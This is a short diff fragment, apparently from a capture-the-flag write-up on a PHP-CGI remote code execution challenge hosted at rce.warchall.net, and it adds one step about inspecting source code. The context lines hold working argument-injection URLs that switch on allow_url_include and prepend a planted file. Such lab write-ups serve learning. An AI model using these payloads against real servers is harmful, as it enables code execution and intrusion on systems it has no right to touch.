@@ -28,3 +28,4 @@ print_r($out);
 >http://rce.warchall.net/?-dallow_url_include=On+-dauto_prepend_file=/tmp/2.php+-n
 - Access the target script with the manipulated parameters and encoded url:
 >http://rce.warchall.net/?-dallow_url_include%3DOn+-dauto_prepend_file%3D%2ftmp%2f2.php+-n
+- Inspect the source code
